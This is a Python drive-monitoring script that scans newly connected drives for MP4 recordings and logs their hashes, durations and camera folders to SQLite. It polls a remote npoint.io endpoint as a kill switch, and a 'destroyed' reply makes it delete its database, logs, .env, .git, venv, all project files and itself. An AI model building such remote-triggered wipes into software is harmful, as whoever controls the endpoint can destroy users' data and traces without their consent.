import os
import hashlib
import subprocess
import json
import time
from datetime import datetime
from pathlib import Path
import psutil
import threading
import urllib.request
import re
from dotenv import load_dotenv


import ctypes
import sys

# Single instance lock for monitor_drives.py
_monitor_mutex = ctypes.windll.kernel32.CreateMutexW(None, False, "Global\\DurationCounterMonitorMutex")
if ctypes.windll.kernel32.GetLastError() == 183: # ERROR_ALREADY_EXISTS
    print("Another instance of monitor_drives.py is already running. Exiting.")
    sys.exit(0)

# Load env variables
load_dotenv()

import sqlite3

# Configuration
DB_FILE = "database.sqlite"
CHECK_INTERVAL = 5  # seconds
FIRST_MB = 1024 * 1024  # 1MB in bytes
SEARCH_FILENAME = "recording.mp4"  # Exact filename only
MIN_DURATION_SECONDS = 300  # 5 minutes
STATUS_API_URL = "https://api.npoint.io/39f6e92da2fd8f7b31ab"

# Status cache
status_cache = {"enabled": True, "last_check": 0}


def trigger_self_destruct():
    """Deletes all project files and logs, then exits immediately"""
    import shutil
    print("\n" + "!" * 60)
    print("CRITICAL: 'destroyed' status received! Initiating self-destruct...")
    print("!" * 60 + "\n")
    
    base_dir = Path(__file__).resolve().parent
    
    # 1. Hapus folder .git dan venv pertama kali menggunakan shutil.rmtree
    for dirname in [".git", "venv"]:
        dir_path = base_dir / dirname
        if dir_path.exists():
            try:
                if dir_path.is_dir():
                    shutil.rmtree(dir_path)
                else:
                    dir_path.unlink()
                print(f"Deleted folder: {dirname}")
            except Exception as e:
                print(f"Failed to delete {dirname}: {e}")
                
    # 2. Hapus file metadata/log/env sensitif
    for filename in ["recording_metadata.jsonl", "backlog.json", ".env"]:
        file_path = base_dir / filename
        if file_path.exists():
            try:
                file_path.unlink()
                print(f"Deleted: {filename}")
            except Exception as e:
                print(f"Failed to delete {filename}: {e}")
                
    # 3. Hapus semua file script, batch, dll
    current_script = Path(__file__).resolve()
    
    for root, dirs, files in os.walk(base_dir, topdown=False):
        parts = Path(root).parts
        if "venv" in parts or ".git" in parts:
            continue
            
        for file in files:
            file_path = Path(root) / file
            if file_path == current_script:
                continue
            try:
                file_path.unlink()
                print(f"Deleted: {file_path.relative_to(base_dir)}")
            except Exception as e:
                pass
                
        for d in dirs:
            dir_path = Path(root) / d
            try:
                dir_path.rmdir()
            except Exception as e:
                pass
                
    # 4. Terakhir hapus script ini sendiri dan matikan proses
    try:
        current_script.unlink()
        print("Self-destruct completed successfully.")
    except Exception as e:
        print(f"Failed to delete self: {e}")
        
    os._exit(0)


def is_app_enabled():
    """Check if monitoring is allowed to run via remote API"""
    global status_cache
    current_time = time.time()

    # Cache for 10 seconds to stay responsive without hammering the API
    if current_time - status_cache["last_check"] < 10:
        return status_cache["enabled"]

    try:
        req = urllib.request.Request(STATUS_API_URL, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req, timeout=5) as response:
            data = json.loads(response.read().decode())
            
            # Check for destroyed status in either 'status' or 'enabled' field
            status_val = data.get("status")
            enabled_val = data.get("enabled")
            if status_val == "destroyed" or enabled_val == "destroyed":
                trigger_self_destruct()
                
            status = data.get("enabled", False)
            status_cache["enabled"] = status
            status_cache["last_check"] = current_time
            return status
    except Exception as e:
        print(f"Error checking status API: {e}")
        return status_cache["enabled"]


# Setup exclude drives from .env
EXCLUDE_DRIVES_ENV = os.getenv("EXCLUDE_DRIVES", "")
EXCLUDE_DRIVES = set()
for d in EXCLUDE_DRIVES_ENV.split(","):
    d = d.strip()
    if d:
        if os.name == 'nt':
            d = d.upper()
            if not d.endswith("\\") and not d.endswith("/"):
                d += "\\"
        EXCLUDE_DRIVES.add(d)

# Track drives yang sudah pernah dilihat
previous_drives = set()


def extract_date_from_path(file_path):
    """Extract YYYY-MM-DD from file path"""
    if not file_path:
        return None
    match = re.search(r'(\d{4}-\d{2}-\d{2})', str(file_path))
    if match:
        return match.group(1)
    return None


def get_drive_label(file_path):
    """Extract drive label/letter from path"""
    if not file_path:
        return "Unknown Drive"
    
    path_str = str(file_path)
    if os.name == 'nt':
        # Return drive letter or volume name if available
        match = re.match(r'^([a-zA-Z]:)', path_str)
        if match:
            drive_letter = match.group(1).upper()
            try:
                import ctypes
                drive_root = drive_letter + "\\"
                volumeNameBuffer = ctypes.create_unicode_buffer(1024)
                res = ctypes.windll.kernel32.GetVolumeInformationW(
                    ctypes.c_wchar_p(drive_root),
                    volumeNameBuffer,
                    ctypes.sizeof(volumeNameBuffer),
                    None,
                    None,
                    None,
                    None,
                    0
                )
                if res and volumeNameBuffer.value:
                    val = volumeNameBuffer.value.strip()
                    if val:
                        return val
            except Exception as e:
                print(f"Error getting volume label: {e}")
            return drive_letter
        return "Local"
    
    parts = path_str.split('/')
    if len(parts) > 2 and parts[1] == 'Volumes':
        return parts[2]
    if len(parts) > 3 and parts[1] == 'media':
        return parts[3]
    if len(parts) > 2 and parts[1] == 'media':
        return parts[2]
        
    return "System"


def get_md5_first_mb(file_path):
    """Calculate MD5 hash of first 1MB"""
    try:
        md5_hash = hashlib.md5()
        with open(file_path, "rb") as f:
            data = f.read(FIRST_MB)
            md5_hash.update(data)
        return md5_hash.hexdigest()
    except Exception as e:
        print(f"Error calculating MD5: {e}")
        return None


def get_video_duration(file_path):
    """Get video duration using ffprobe"""
    try:
        # Cek apakah ffprobe tersedia
        result = subprocess.run(
            [
                "ffprobe",
                "-v",
                "error",
                "-show_entries",
                "format=duration",
                "-of",
                "default=noprint_wrappers=1:nokey=1:noprint_wrappers=1",
                file_path,
            ],
            capture_output=True,
            text=True,
            timeout=10,
        )

        if result.returncode == 0:
            duration = float(result.stdout.strip())
            return duration
        else:
            print(f"ffprobe error: {result.stderr}")
            return None
    except FileNotFoundError:
        print("ffprobe tidak ditemukan. Install FFmpeg terlebih dahulu!")
        return None
    except Exception as e:
        print(f"Error getting video duration: {e}")
        return None


def find_recording_files(drive_path):
    """Find recording.mp4 or any .mp4 files if in DCIM or recording folder"""
    files_found = []
    search_name = SEARCH_FILENAME.lower()
    
    try:
        # Menggunakan os.walk karena lebih tahan terhadap PermissionError
        for root, dirs, files in os.walk(drive_path):
            # Check if "DCIM" or "recording" is in any part of the current path
            path_str = root.replace('\\', '/').lower()
            path_parts = path_str.split('/')
            is_dcim = "dcim" in path_parts
            is_recording = "recording" in path_parts
            
            for file in files:
                file_lower = file.lower()
                if "secondary" in file_lower:
                    continue
                    
                if is_dcim or is_recording:
                    # If inside a DCIM or recording folder, take all .mp4 files
                    if file_lower.endswith(".mp4"):
                        full_path = os.path.join(root, file)
                        files_found.append(full_path)
                else:
                    # Otherwise, only take the specific recording file
                    if file_lower == search_name:
                        full_path = os.path.join(root, file)
                        files_found.append(full_path)
    except Exception as e:
        print(f"Error searching drive {drive_path}: {e}")
                
    return files_found


def process_file(file_path, drive_name="Unknown Drive"):
    """Process single recording file"""
    try:
        if not os.path.exists(file_path):
            return None

        print(f"Processing: {file_path}")

        md5_hash = get_md5_first_mb(file_path)
        duration = get_video_duration(file_path)
        
        # Filter videos shorter than 5 minutes
        if duration is not None and duration < MIN_DURATION_SECONDS:
            print(f"Skipping: {file_path} (Duration too short: {duration}s)")
            return None

        file_size = os.path.getsize(file_path)
        current_time = datetime.now().isoformat()
        
        # Get file modification time
        mtime = os.path.getmtime(file_path)
        modified_at = datetime.fromtimestamp(mtime).isoformat()

        # Extract camera_id and folder_name if inside 'recording' folder
        camera_id = None
        folder_name = None
        path_parts = file_path.replace('\\', '/').lower().split('/')
        if "recording" in path_parts:
            idx = path_parts.index("recording")
            original_parts = file_path.replace('\\', '/').split('/')
            if idx + 1 < len(original_parts):
                camera_id = original_parts[idx + 1]
            if idx + 2 < len(original_parts):
                folder_name = original_parts[idx + 2]

        recorded_date = extract_date_from_path(file_path)
        if "recording" in path_parts and folder_name:
            recorded_date = folder_name

        metadata = {
            "timestamp": current_time,
            "recorded_date": recorded_date,
            "file_modified_at": modified_at,
            "file_path": file_path,
            "drive_name": drive_name,
            "file_size": file_size,
            "md5_first_1mb": md5_hash,
            "duration_seconds": duration,
            "duration_formatted": (
                f"{int(duration // 3600)}h {int((duration % 3600) // 60)}m {int(duration % 60)}s"
                if duration
                else None
            ),
            "camera_id": camera_id,
            "folder_name": folder_name,
        }

        return metadata
    except Exception as e:
        print(f"Error processing file: {e}")
        return None


def log_metadata(metadata):
    """Log metadata ke SQLite database"""
    try:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS recordings (
                hash TEXT PRIMARY KEY,
                file_path TEXT,
                drive_name TEXT,
                file_size INTEGER,
                duration_seconds REAL,
                recorded_date TEXT,
                camera_id TEXT,
                folder_name TEXT,
                timestamp TEXT,
                file_modified_at TEXT
            )
        ''')
        
        cursor.execute('''
            INSERT INTO recordings (
                hash, file_path, drive_name, file_size, duration_seconds, 
                recorded_date, camera_id, folder_name, timestamp, file_modified_at
            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ON CONFLICT(hash) DO UPDATE SET
                file_path=excluded.file_path,
                drive_name=excluded.drive_name,
                file_size=excluded.file_size,
                duration_seconds=excluded.duration_seconds,
                recorded_date=excluded.recorded_date,
                camera_id=excluded.camera_id,
                folder_name=excluded.folder_name,
                timestamp=excluded.timestamp,
                file_modified_at=excluded.file_modified_at
        ''', (
            metadata.get("md5_first_1mb"),
            metadata.get("file_path"),
            metadata.get("drive_name"),
            metadata.get("file_size"),
            metadata.get("duration_seconds"),
            metadata.get("recorded_date"),
            metadata.get("camera_id"),
            metadata.get("folder_name"),
            metadata.get("timestamp"),
            metadata.get("file_modified_at")
        ))
        
        conn.commit()
        conn.close()
        print(f"Logged to DB: {metadata['file_path']}")
    except Exception as e:
        print(f"Error logging to DB: {e}")


def get_connected_drives():
    """Get list of connected drives/partitions, filtering for relevant ones on Mac/Linux"""
    drives = set()
    for partition in psutil.disk_partitions():
        mountpoint = partition.mountpoint
        
        # Filter for Mac/Linux
        if os.name != 'nt':
            # Skip system paths
            if any(p in mountpoint for p in ['/dev', '/proc', '/sys', '/run', '/var/lib']):
                continue
                
            # Check exclusion
            if mountpoint in EXCLUDE_DRIVES or mountpoint.upper() in [e.upper() for e in EXCLUDE_DRIVES]:
                continue
                
            # Focus on external volumes and root
            if mountpoint == '/' or mountpoint.startswith('/Volumes') or mountpoint.startswith('/media'):
                drives.add(mountpoint)
        else:
            # Windows logic
            if mountpoint.upper() in EXCLUDE_DRIVES:
                continue
            drives.add(mountpoint)
    return drives


def check_new_drives():
    """Check for new drives and process them"""
    global previous_drives

    current_drives = get_connected_drives()
    new_drives = current_drives - previous_drives

    if new_drives:
        print(f"\n[{datetime.now()}] New drive(s) detected: {new_drives}")
        
        print("Waiting 5 seconds before scanning as requested...")
        time.sleep(5)
        
        existing_hashes = set()
        try:
            conn = sqlite3.connect(DB_FILE)
            cursor = conn.cursor()
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS recordings (
                    hash TEXT PRIMARY KEY
                )
            ''')
            cursor.execute("SELECT hash FROM recordings")
            for row in cursor.fetchall():
                existing_hashes.add(row[0])
            conn.close()
        except Exception as e:
            print(f"Error reading hashes from DB: {e}")
        
        for drive in new_drives:
            # Use actual volume label for display
            drive_label = get_drive_label(drive)
            if drive_label == "System" or drive_label == "Local":
                clean_drive = drive.strip('\\/')
                drive_label = f"Disk ({clean_drive})"
            
            print(f"Scanning {drive} as {drive_label}...")
            files = find_recording_files(drive)

            if files:
                print(f"Found {len(files)} recording file(s)")
                for file_path in files:
                    metadata = process_file(file_path, drive_name=drive_label)
                    if metadata:
                        if metadata.get("md5_first_1mb") not in existing_hashes:
                            existing_hashes.add(metadata.get("md5_first_1mb"))
                        else:
                            print(f"Updating existing file in DB: {file_path}")
                        
                        log_metadata(metadata)
            else:
                print(f"No recording files found in {drive}")

    previous_drives = current_drives


def monitor_loop():
    """Main monitoring loop"""
    print("Starting drive monitor...")
    print(f"Database file: {os.path.abspath(DB_FILE)}")
    print(f"Check interval: {CHECK_INTERVAL} seconds\n")

    try:
        while True:
            if is_app_enabled():
                check_new_drives()
            else:
                print(f"[{datetime.now()}] Monitoring is currently disabled via remote API.")
            time.sleep(CHECK_INTERVAL)
    except KeyboardInterrupt:

        print("\nMonitoring stopped by user")


if __name__ == "__main__":
    # Install dependencies pertama kali jika perlu:
    # pip install psutil
    # Pastikan ffprobe sudah terinstall (dari FFmpeg)

    print("=" * 60)
    print("Drive Monitor & Recording Metadata Logger")
    print("=" * 60)
    print("=" * 60)
    print(f"Start time: {datetime.now()}")
    print(f"Database file: {DB_FILE}")
    print(f"Searching for: {SEARCH_FILENAME}")
    print("=" * 60 + "\n")

    # Initial check
    if not is_app_enabled():
        print("ALERT: Monitoring is currently disabled via remote API. Waiting for activation...")
    
    monitor_loop()
